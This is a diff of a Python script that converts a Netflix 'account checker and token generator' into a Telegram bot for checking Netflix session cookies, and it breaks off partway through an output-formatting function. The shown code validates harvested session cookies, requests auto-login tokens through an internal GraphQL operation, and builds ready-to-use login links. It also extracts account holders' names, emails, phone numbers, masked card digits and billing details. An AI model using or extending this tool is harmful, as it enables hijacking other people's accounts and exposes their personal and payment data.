@@ -1,1766 +1,1396 @@
 #!/usr/bin/env python3
 """
-Netflix Token Generator Pro - COMPLETE VERSION
-Enterprise Grade Account Checker & Token Generator
-Supports multiple input formats, multi-threaded processing, premium filtering, and detailed analytics
+Netflix Cookie Checker Bot – Telegram version
+Uses the same checking logic as main.py
 """
 
-import logging
-import requests
-import json
-import re
-import zipfile
+import asyncio
+import copy
+import html
 import io
-import concurrent.futures
+import json
+import logging
+import os
+import random
+import re
+import string
+import sys
 import threading
 import time
 import traceback
-import sys
-import os
-import hashlib
-import base64
-import urllib.parse
-from datetime import datetime, timedelta
-from typing import Dict, List, Tuple, Optional, Any, Union, Set
-from dataclasses import dataclass, field, asdict
+import unicodedata
+import zipfile
 from collections import defaultdict
-from enum import Enum
-from pathlib import Path
-from functools import wraps
-from queue import Queue
-import random
-import string
-import asyncio
+from datetime import datetime, timedelta, timezone
+from typing import Dict, List, Optional, Tuple, Any, Set
 
-# Third party imports with error handling
-try:
-    import pytz
-    from pytz import UTC
-    PYTZ_AVAILABLE = True
-except ImportError:
-    PYTZ_AVAILABLE = False
-    print("⚠️ pytz not installed. Run: pip install pytz")
+import requests
+import concurrent.futures
 
-try:
-    import pycountry
-    PYCOUNTRY_AVAILABLE = True
-except ImportError:
-    PYCOUNTRY_AVAILABLE = False
-    print("⚠️ pycountry not installed. Run: pip install pycountry")
+# -------------------------------
+#   Core functions from main.py
+# -------------------------------
 
+DEFAULT_CONFIG = {
+    "txt_fields": {
+        "name": False, "email": False, "max_streams": True, "plan": True,
+        "country": True, "member_since": False, "next_billing": True,
+        "extra_members": True, "payment_method": True, "card": False,
+        "phone": False, "quality": True, "hold_status": False,
+        "email_verified": False, "membership_status": False,
+        "profiles": True, "user_guid": False,
+    },
+    "nftoken": True,
+    "notifications": {"webhook": {"enabled": False}, "telegram": {"enabled": False}},
+    "display": {"mode": "simple"},
+    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
+}
+
+REQUIRED_NETFLIX_COOKIES = ("NetflixId", "SecureNetflixId", "nfvdid")
+OPTIONAL_NETFLIX_COOKIES = ("OptanonConsent",)
+ALL_NETFLIX_COOKIE_NAMES = set(REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
+
+NFTOKEN_API_URL = "https://android13.prod.ftl.netflix.com/graphql"
+NFTOKEN_HEADERS = {
+    "User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
+    "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
+    "Content-Type": "application/json",
+    "Origin": "https://www.netflix.com",
+    "Referer": "https://www.netflix.com/",
+}
+NFTOKEN_PAYLOAD = {
+    "operationName": "CreateAutoLoginToken",
+    "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
+    "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
+}
+
+MONTH_ALIASES = {
+    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
+    "styczen": 1, "stycznia": 1, "มกราคม": 1, "มกรา": 1, "ม.ค": 1, "يناير": 1,
+    "januari": 1, "gennaio": 1, "ianuarie": 1, "jan": 1, "يناير": 1, "בינואר": 1,
+    "ιανουαριος": 1,
+    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
+    "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "กุมภา": 2, "ก.พ": 2, "فبراير": 2,
+    "februari": 2, "febbraio": 2, "februarie": 2, "feb": 2, "בפברואר": 2,
+    "φεβρουαριος": 2,
+    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3,
+    "มีนาคม": 3, "มีนา": 3, "มี.ค": 3, "مارس": 3, "maret": 3, "mac": 3,
+    "mart": 3, "martie": 3, "marz": 3, "brezna": 3, "ozujka": 3, "maart": 3,
+    "اذار": 3, "بمارس": 3, "במרץ": 3, "marcius": 3, "martie": 3, "μαρτιος": 3,
+    "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4, "เมษายน": 4, "เมษา": 4,
+    "เม.ย": 4, "أبريل": 4, "ابريل": 4, "aprile": 4, "april": 4, "aprilie": 4,
+    "באפריל": 4, "nisan": 4, "apr": 4, "απριλιος": 4,
+    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5, "พฤษภาคม": 5, "พฤษภา": 5,
+    "พ.ค": 5, "مايو": 5, "mei": 5, "maggio": 5, "mayis": 5, "במאי": 5, "μαιος": 5,
+    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6,
+    "มิถุนายน": 6, "มิถุนา": 6, "มิ.ย": 6, "يونيو": 6, "juni": 6, "giugno": 6,
+    "ביוני": 6, "ιουνιος": 6,
+    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7,
+    "กรกฎาคม": 7, "กรกฎา": 7, "ก.ค": 7, "يوليو": 7, "juli": 7, "luglio": 7,
+    "ביולי": 7, "ιουλιος": 7,
+    "august": 8, "agosto": 8, "aout": 8, "août": 8, "agost": 8, "sierpien": 8,
+    "sierpnia": 8, "สิงหาคม": 8, "สิงหา": 8, "ส.ค": 8, "أغسطس": 8, "اغسطس": 8,
+    "agustus": 8, "agosto": 8, "agustos": 8, "באוגוסט": 8, "αυγουστος": 8,
+    "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9,
+    "กันยายน": 9, "กันยา": 9, "ก.ย": 9, "سبتمبر": 9, "september": 9,
+    "settembre": 9, "בספטמבר": 9, "σεπτεμβριος": 9,
+    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10,
+    "pazdziernika": 10, "ตุลาคม": 10, "ตุลา": 10, "ต.ค": 10, "أكتوبر": 10,
+    "اكتوبر": 10, "oktober": 10, "ottobre": 10, "באוקטובר": 10, "οκτωβριος": 10,
+    "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11,
+    "พฤศจิกายน": 11, "พฤศจิกา": 11, "พ.ย": 11, "نوفمبر": 11, "november": 11,
+    "novembre": 11, "בנובמבר": 11, "νοεμβριος": 11,
+    "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12,
+    "ธันวาคม": 12, "ธันวา": 12, "ธ.ค": 12, "ديسمبر": 12, "desember": 12,
+    "dicembre": 12, "december": 12, "בדצמבר": 12, "δεκεμβριος": 12,
+}
+
+# ----------------------------------------------------------------------
+# Helper functions copied from main.py
+# ----------------------------------------------------------------------
+
+def decode_netflix_value(value):
+    if value is None:
+        return None
+    cleaned = html.unescape(str(value))
+    replacements = {
+        "\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " ",
+    }
+    for src, tgt in replacements.items():
+        cleaned = cleaned.replace(src, tgt)
+    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
+    for _ in range(3):
+        prev = cleaned
+        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
+        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
+        cleaned = cleaned.replace("\\\\", "\\")
+        if cleaned == prev:
+            break
+    cleaned = re.sub(r"\s+", " ", cleaned).strip()
+    return cleaned or None
+
+def escape_md(text):
+    escape_chars = r"_*[]()~`>#+-=|{}.!\\"
+    return ''.join('\\' + c if c in escape_chars else c for c in text)
+
+def extract_first_match(text, patterns, flags=0):
+    for pat in patterns:
+        m = re.search(pat, text, flags)
+        if m:
+            return decode_netflix_value(m.group(1))
+    return None
+
+def extract_bool_value(text, patterns):
+    val = extract_first_match(text, patterns, re.IGNORECASE)
+    if val is None:
+        return None
+    l = val.lower()
+    if l == "true":
+        return "Yes"
+    if l == "false":
+        return "No"
+    return val
+
+def extract_profile_names(text):
+    names = []
+    for pat in [
+        r'"profileName"\s*:\s*"([^"]+)"',
+        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+    ]:
+        for found in re.findall(pat, text, re.DOTALL):
+            dec = decode_netflix_value(found)
+            if dec and dec not in names:
+                names.append(dec)
+    for m in re.finditer(r'"__typename"\s*:\s*"Profile"', text):
+        snippet = text[m.start():m.start()+1200]
+        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
+        if name_match:
+            dec = decode_netflix_value(name_match.group(1))
+            if dec and dec not in names:
+                names.append(dec)
+    if not names:
+        return None
+    return ", ".join(names)
+
+def merge_info(primary, fallback):
+    merged = dict(fallback or {})
+    for k, v in (primary or {}).items():
+        if v not in (None, "", [], {}):
+            merged[k] = v
+    return merged
+
+def extract_info_from_graphql_payload(text):
+    try:
+        data = json.loads(text).get("data", {})
+    except:
+        return {}
+    if not isinstance(data, dict):
+        return {}
+    growth_account = data.get("growthAccount") or {}
+    current_profile = data.get("currentProfile") or {}
+    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
+    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
+    next_billing = growth_account.get("nextBillingDate") or {}
+    hold_meta = growth_account.get("growthHoldMetadata") or {}
+    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
+    raw_phone = local_phone.get("rawPhoneNumber") or {}
+    payment_methods = growth_account.get("growthPaymentMethods") or []
+    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
+    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
+    payment_typename = str(payment_method.get("__typename") or "")
+    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
+    profiles = growth_account.get("profiles") or []
+    phone_digits = None
+    phone_verified_graphql = None
+    phone_country_code = None
+    if isinstance(raw_phone, dict):
+        digits_obj = raw_phone.get("phoneNumberDigits") or {}
+        phone_digits = digits_obj.get("value") if isinstance(digits_obj, dict) else raw_phone.get("phoneNumberDigits")
+        phone_verified_graphql = raw_phone.get("isVerified")
+        phone_country_code = raw_phone.get("countryCode")
+    else:
+        phone_digits = raw_phone
+    def _growth_email(profile_obj):
+        if not isinstance(profile_obj, dict):
+            return None, None
+        ge = profile_obj.get("growthEmail") or {}
+        email_obj = ge.get("email") or {}
+        email_val = email_obj.get("value") if isinstance(email_obj, dict) else None
+        return email_val, ge.get("isVerified")
+    email_value, email_verified = _growth_email(current_profile)
+    if not email_value:
+        for p in profiles:
+            email_value, email_verified = _growth_email(p)
+            if email_value:
+                break
+    profile_names = []
+    for p in profiles:
+        if isinstance(p, dict):
+            name = decode_netflix_value(p.get("name"))
+            if name and name not in profile_names:
+                profile_names.append(name)
+    feature_types = []
+    for plan_obj in (current_plan, next_plan):
+        for feat in (plan_obj.get("availableFeatures") or []):
+            if isinstance(feat, dict) and feat.get("type"):
+                feature_types.append(str(feat["type"]).upper())
+    def _extract_price(plan_obj):
+        if not isinstance(plan_obj, dict):
+            return None
+        candidates = [
+            plan_obj.get("priceDisplay"), plan_obj.get("displayPrice"),
+            plan_obj.get("formattedPrice"), plan_obj.get("formattedPlanPrice"),
+            plan_obj.get("planPriceDisplay"),
+        ]
+        for c in candidates:
+            d = decode_netflix_value(c)
+            if d:
+                return d
+        price_obj = plan_obj.get("price")
+        if isinstance(price_obj, dict):
+            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
+                d = decode_netflix_value(price_obj.get(key))
+                if d:
+                    return d
+        return None
+    info = {
+        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
+        "email": decode_netflix_value(email_value),
+        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
+        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
+        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
+        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
+        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
+        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
+        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
+        "planPrice": _extract_price(current_plan) or _extract_price(next_plan),
+        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
+        "maskedCard": None,
+        "phoneNumber": phone_digits,
+        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
+        "holdStatus": "Yes" if hold_meta.get("isUserOnHold") is True else "No" if hold_meta.get("isUserOnHold") is False else None,
+        "emailVerified": "Yes" if email_verified is True else "No" if email_verified is False else None,
+        "phoneVerified": "Yes" if phone_verified_graphql is True else "No" if phone_verified_graphql is False else None,
+        "profiles": ", ".join(profile_names) if profile_names else None,
+    }
+    if "Card" in payment_typename:
+        info["paymentMethodType"] = "CC"
+        if payment_display_text:
+            if re.fullmatch(r"\d{4}", payment_display_text):
+                info["maskedCard"] = payment_display_text
+            else:
+                info["maskedCard"] = payment_display_text
+    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
+        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text
+    if not info["paymentMethodType"] and payment_methods and "Card" in payment_typename:
+        info["paymentMethodType"] = "CC"
+    return {k: v for k, v in info.items() if v not in (None, "", [], {})}
+
+def extract_info(text):
+    graphql_info = extract_info_from_graphql_payload(text)
+    extracted = {
+        "accountOwnerName": extract_first_match(text, [
+            r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
+            r'"accountOwnerName"\s*:\s*"([^"]+)"',
+            r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+            r'"firstName"\s*:\s*"([^"]+)"',
+        ]),
+        "email": extract_first_match(text, [
+            r'"emailAddress"\s*:\s*"([^"]+)"',
+            r'"email"\s*:\s*"([^"]+)"',
+            r'"loginId"\s*:\s*"([^"]+)"',
+        ]),
+        "countryOfSignup": extract_first_match(text, [
+            r'"currentCountry"\s*:\s*"([^"]+)"',
+            r'"countryOfSignup":\s*"([^"]+)"',
+        ]),
+        "memberSince": extract_first_match(text, [r'"memberSince":\s*"([^"]+)"']),
+        "nextBillingDate": extract_first_match(text, [
+            r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
+            r'"nextBillingDate"\s*:\s*"([^"]+)"',
+            r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+        ]),
+        "userGuid": extract_first_match(text, [r'"userGuid":\s*"([^"]+)"']),
+        "showExtraMemberSection": extract_bool_value(text, [
+            r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
+            r'"showExtraMemberSection"\s*:\s*(true|false)',
+        ]),
+        "membershipStatus": extract_first_match(text, [r'"membershipStatus":\s*"([^"]+)"']),
+        "maxStreams": extract_first_match(text, [
+            r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
+            r'"maxStreams"\s*:\s*"?([^",}]+)"?',
+        ]),
+        "localizedPlanName": extract_first_match(text, [
+            r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+            r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
+            r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
+            r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
+            r'"localizedPlanName"\s*:\s*"([^"]+)"',
+            r'"planName"\s*:\s*"([^"]+)"',
+        ]),
+        "planPrice": extract_first_match(text, [
+            r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
+            r'"formattedPrice"\s*:\s*"([^"]+)"',
+            r'"planPriceDisplay"\s*:\s*"([^"]+)"',
+            r'"displayPrice"\s*:\s*"([^"]+)"',
+            r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+            r'"planPrice"\s*:\s*"([^"]+)"',
+        ]),
+        "paymentMethodExists": extract_bool_value(text, [
+            r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
+            r'"paymentMethodExists"\s*:\s*(true|false)',
+        ]),
+        "paymentMethodType": extract_first_match(text, [
+            r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+            r'"paymentMethod"\s*:\s*"([^"]+)"',
+            r'"paymentType"\s*:\s*"([^"]+)"',
+            r'"paymentMethodType"\s*:\s*"([^"]+)"',
+        ]),
+        "maskedCard": extract_first_match(text, [
+            r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
+            r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
+            r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
+            r'"lastFour"\s*:\s*"([^"]+)"',
+            r'"creditCardLast4"\s*:\s*"([^"]+)"',
+            r'"maskedCard"\s*:\s*"([^"]+)"',
+        ]),
+        "phoneNumber": extract_first_match(text, [
+            r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
+            r'"phoneNumber"\s*:\s*"([^"]+)"',
+            r'"mobilePhone"\s*:\s*"([^"]+)"',
+        ]),
+        "phoneVerified": extract_bool_value(text, [
+            r'"phoneVerified"\s*:\s*(true|false)',
+            r'"isPhoneVerified"\s*:\s*(true|false)',
+        ]),
+        "videoQuality": extract_first_match(text, [
+            r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
+            r'"videoQuality"\s*:\s*"([^"]+)"',
+            r'"quality"\s*:\s*"([^"]+)"',
+        ]),
+        "holdStatus": extract_bool_value(text, [
+            r'"holdStatus"\s*:\s*(true|false)',
+            r'"isOnHold"\s*:\s*(true|false)',
+            r'"pastDue"\s*:\s*(true|false)',
+        ]),
+        "emailVerified": extract_bool_value(text, [
+            r'"emailVerified"\s*:\s*(true|false)',
+            r'"isEmailVerified"\s*:\s*(true|false)',
+            r'"emailAddressVerified"\s*:\s*(true|false)',
+        ]),
+        "profiles": extract_profile_names(text),
+    }
+    merged = merge_info(graphql_info, extracted)
+    # Additional cleanup
+    if merged.get("localizedPlanName"):
+        merged["localizedPlanName"] = merged["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")
+    if not merged.get("paymentMethodType"):
+        merged["paymentMethodType"] = merged.get("paymentMethodExists")
+    if merged.get("maskedCard") and re.fullmatch(r"\d{4}", merged["maskedCard"]):
+        if merged.get("paymentMethodType") in {None, "", "Yes"}:
+            merged["paymentMethodType"] = "CC"
+    if merged.get("holdStatus") is None and merged.get("membershipStatus") == "CURRENT_MEMBER":
+        merged["holdStatus"] = "No"
+    if merged.get("emailVerified") is None and merged.get("email"):
+        merged["emailVerified"] = "Yes"
+    # Normalize phone
+    phone = merged.get("phoneNumber")
+    if phone:
+        merged["phoneDisplay"] = normalize_phone_number(phone, merged.get("countryOfSignup"))
+    # Profiles
+    profiles = merged.get("profiles")
+    if profiles:
+        merged["profileCount"] = len([n for n in profiles.split(", ") if n])
+        merged["profilesDisplay"] = profiles
+    else:
+        merged["profileCount"] = None
+        merged["profilesDisplay"] = None
+    return merged
+
+def normalize_phone_number(value, country_code=None):
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return None
+    if str(cleaned).startswith("+"):
+        return cleaned
+    digits = re.sub(r"\D+", "", str(cleaned))
+    if not digits:
+        return cleaned
+    norm_country = (decode_netflix_value(country_code) or "").strip().upper()
+    dial_map = {"IN": "91"}
+    prefix = dial_map.get(norm_country)
+    if prefix and digits.startswith("0") and len(digits) >= 10:
+        return f"+{prefix}{digits.lstrip('0')}"
+    return cleaned
+
+def country_code_to_flag(code):
+    code = (decode_netflix_value(code) or "").strip().upper()
+    if len(code) != 2 or not code.isalpha():
+        return ""
+    return "".join(chr(127397 + ord(c)) for c in code)
+
+def parse_localized_date(cleaned):
+    if not cleaned:
+        return None
+    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
+        try:
+            return datetime.strptime(cleaned, fmt)
+        except:
+            continue
+    try:
+        return datetime.fromisoformat(cleaned.replace("Z", "+00:00"))
+    except:
+        pass
+    num_parts = [int(p) for p in re.findall(r"\d+", cleaned)]
+    if len(num_parts) >= 3:
+        a, b, c = num_parts[0], num_parts[1], num_parts[2]
+        try:
+            if 1900 <= a <= 3000 and 1 <= b <= 12 and 1 <= c <= 31:
+                return datetime(a, b, c)
+            if 1 <= a <= 31 and 1 <= b <= 12 and 1900 <= c <= 3000:
+                return datetime(c, b, a)
+        except:
+            pass
+    low = cleaned.lower()
+    simp = unicodedata.normalize("NFKD", low)
+    simp = "".join(ch for ch in simp if not unicodedata.combining(ch))
+    year_match = re.search(r"(19|20)\d{2}", simp)
+    if not year_match:
+        return None
+    year = int(year_match.group(0))
+    month = None
+    for alias, m in MONTH_ALIASES.items():
+        if alias in low or alias in simp:
+            month = m
+            break
+    if month is None:
+        return None
+    day = 1
+    for n in num_parts:
+        if n == year:
+            continue
+        if 1 <= n <= 31:
+            day = n
+            break
+    try:
+        return datetime(year, month, day)
+    except:
+        return None
+
+def format_display_date(value):
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return "UNKNOWN"
+    parsed = parse_localized_date(cleaned)
+    if parsed:
+        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
+    return cleaned
+
+def format_member_since(value):
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return "UNKNOWN"
+    parsed = parse_localized_date(cleaned)
+    if parsed:
+        return parsed.strftime("%B %Y")
+    # fallback: try to extract month/year numbers
+    nums = re.findall(r"\d+", cleaned)
+    if len(nums) >= 2:
+        try:
+            month = int(nums[0])
+            year = int(nums[-1])
+            if 1 <= month <= 12 and 1900 <= year <= 3000:
+                return datetime(year, month, 1).strftime("%B %Y")
+        except:
+            pass
+    low = cleaned.lower()
+    simp = unicodedata.normalize("NFKD", low)
+    simp = "".join(ch for ch in simp if not unicodedata.combining(ch))
+    ym = re.search(r"(19|20)\d{2}", simp)
+    if ym:
+        year = int(ym.group(0))
+        for alias, month in MONTH_ALIASES.items():
+            if alias in low or alias in simp:
+                try:
+                    return datetime(year, month, 1).strftime("%B %Y")
+                except:
+                    pass
+    return cleaned
+
+def normalize_plan_key(plan_name):
+    if not plan_name:
+        return "unknown"
+    simp = unicodedata.normalize("NFKD", plan_name)
+    simp = "".join(ch for ch in simp if not unicodedata.combining(ch))
+    norm = re.sub(r"[^\w]+", "_", simp.lower(), flags=re.UNICODE).strip("_")
+    return norm or "unknown"
+
+def get_canonical_output_label(plan_key):
+    labels = {
+        "premium": "Premium", "standard_with_ads": "Standard With Ads",
+        "standard": "Standard", "basic": "Basic", "mobile": "Mobile",
+        "free": "Free", "duplicate": "Duplicate", "unknown": "Unknown",
+    }
+    return labels.get(plan_key, "Unknown")
+
+def format_plan_label(plan_key):
+    if not plan_key:
+        return "Unknown"
+    return plan_key.replace("_", " ").title()
+
+def _int_or_none(val):
+    cleaned = decode_netflix_value(val)
+    if cleaned is None:
+        return None
+    try:
+        return int(str(cleaned).strip())
+    except:
+        match = re.search(r"\d+", str(cleaned))
+        if match:
+            try:
+                return int(match.group(0))
+            except:
+                pass
+        return None
+
+def derive_plan_info(info, is_subscribed):
+    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
+    raw_quality = decode_netflix_value(info.get("videoQuality"))
+    streams = _int_or_none(info.get("maxStreams"))
+    if not is_subscribed and not raw_plan:
+        return "free", "Free"
+    normalized = normalize_plan_key(raw_plan) if raw_plan else ""
+    aliases = {
+        "premium": {"premium", "cao_cap", "高級", "高级", "ozel", "المميزة", "พรีเมียม", "פרמיום", "πριμιουμ"},
+        "standard_with_ads": {"standard_with_ads", "standardwithads", "estandar_con_anuncios", "padrao_com_anuncios", "광고형_스탠다드"},
+        "standard": {"standard", "estandar", "standardowy", "padrao", "standart", "มาตรฐาน", "סטנדרטית", "τυπικο"},
+        "basic": {"basic", "basico", "basique", "basis", "βασικο", "基本", "podstawowy", "الاساسية", "בסיסית"},
+        "mobile": {"ponsel", "mobile"},
+    }
+    for canon, ali in aliases.items():
+        if normalized in ali:
+            return canon, get_canonical_output_label(canon)
+    if streams is not None:
+        qnorm = normalize_plan_key(raw_quality) if raw_quality else ""
+        if streams >= 4 or qnorm in {"uhd", "ultra_hd", "4k"}:
+            return "premium", "Premium"
+        if streams >= 2 or qnorm in {"hd", "full_hd"}:
+            return "standard", "Standard"
+        if streams == 1:
+            if normalized in {"ponsel", "mobile"}:
+                return "mobile", "Mobile"
+            return "basic", "Basic"
+    if raw_plan:
+        return normalize_plan_key(raw_plan), raw_plan
+    if not is_subscribed:
+        return "free", "Free"
+    return "unknown", "Unknown"
+
+def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
+    cleaned = decode_netflix_value(value)
+    if cleaned is None or cleaned == "":
+        return unknown_fallback
+    low = str(cleaned).strip().lower()
+    if low in {"false", "none", "null"}:
+        return "N/A" if na_when_false else unknown_fallback
+    return cleaned
+
+def build_account_detail_lines(config, info, is_subscribed):
+    txt_fields = config.get("txt_fields", {})
+    free_hidden = {"member_since", "next_billing", "payment_method", "card", "phone",
+                   "quality", "max_streams", "hold_status", "extra_members", "membership_status"}
+    _, norm_plan_label = derive_plan_info(info, is_subscribed)
+    vals = {
+        "name": normalize_output_value(info.get("accountOwnerName")),
+        "email": normalize_output_value(info.get("email")),
+        "country": normalize_output_value(info.get("countryOfSignup")),
+        "plan": normalize_output_value(norm_plan_label),
+        "member_since": format_member_since(info.get("memberSince")),
+        "next_billing": format_display_date(info.get("nextBillingDate")),
+        "payment_method": normalize_output_value(info.get("paymentMethodType"), na_when_false=True),
+        "card": normalize_output_value(info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True),
+        "phone": normalize_output_value(info.get("phoneDisplay")),
+        "quality": normalize_output_value(info.get("videoQuality")),
+        "max_streams": normalize_output_value((info.get("maxStreams") or "").rstrip("}")),
+        "hold_status": normalize_output_value(info.get("holdStatus")),
+        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
+        "email_verified": normalize_output_value(info.get("emailVerified")),
+        "membership_status": normalize_output_value(info.get("membershipStatus")),
+        "profiles": normalize_output_value(info.get("profilesDisplay")),
+        "user_guid": normalize_output_value(info.get("userGuid")),
+    }
+    labels = [
+        ("name", "Name"), ("email", "Email"), ("country", "Country"), ("plan", "Plan"),
+        ("member_since", "Member Since"), ("next_billing", "Next Billing"),
+        ("payment_method", "Payment"), ("card", "Card"), ("phone", "Phone"),
+        ("quality", "Quality"), ("max_streams", "Streams"), ("hold_status", "Hold Status"),
+        ("extra_members", "Extra Member"), ("email_verified", "Email Verified"),
+        ("membership_status", "Membership Status"), ("profiles", "Profiles"),
+        ("user_guid", "User GUID"),
+    ]
+    lines = []
+    for key, label in labels:
+        if not is_subscribed and key in free_hidden:
+            continue
+        if key == "card" and vals.get("payment_method", "").strip().upper() != "CC":
+            continue
+        if key in {"hold_status", "extra_members"} and vals.get(key) != "Yes":
+            continue
+        if txt_fields.get(key, True):
+            rendered = label
+            if key == "profiles" and info.get("profileCount"):
+                rendered = f"Profiles ({info['profileCount']})"
+            lines.append(f"{rendered}: {vals[key]}")
+    return lines
+
+def get_nftoken_mode(config):
+    raw = config.get("nftoken", True)
+    if isinstance(raw, bool):
+        return "true" if raw else "false"
+    mode = str(raw).strip().lower()
+    if mode in {"true", "false"}:
+        return mode
+    return "true"
+
+def get_nftoken_expiry_utc():
+    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
+
+def has_usable_nftoken(data):
+    if not isinstance(data, dict):
+        return False
+    token = decode_netflix_value(data.get("token"))
+    if not token:
+        return False
+    if str(token).strip().lower() in {"unavailable", "unknown", "none", "null", "false"}:
+        return False
+    return True
+
+def build_nftoken_links(token, mode):
+    if not token or mode == "false":
+        return []
+    return [("Login Link", f"https://netflix.com/?nftoken={token}")]
+
+
+def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
+    flag = country_code_to_flag(info.get("countryOfSignup"))
+
+    profiles_raw = info.get("profilesDisplay") or ""
+    profiles = [p.strip() for p in profiles_raw.split(",") if p.strip()]
+
+    token = (nftoken_data or {}).get("token") if nftoken_data else None
+    expiry = (nftoken_data or {}).get("expires_at_utc") if nftoken_data else None
+
+    netflix_id = ""
+    for line in cookie_content.splitlines():
+        parts = line.split("\t")
+        if len(parts) >= 7 and parts[5] == "NetflixId":
+            netflix_id = parts[6]
+            break
+
+    verified = info.get("emailVerified")
+    verified_text = "✅ Yes" if str(verified).lower() == "yes" else "❌ No"
+
+    streams_text = str(info.get("maxStreams", "?")).rstrip("}")
+
+    lines = []
+
+    lines.append("╭━━━━━━━━━━━━━━━━━━━━━━━━╮")
+    lines.append("🎬 NETFLIX ACCOUNT")
+    lines.append("╰━━━━━━━━━━━━━━━━━━━━━━━━╯")
+    lines.append("")
+
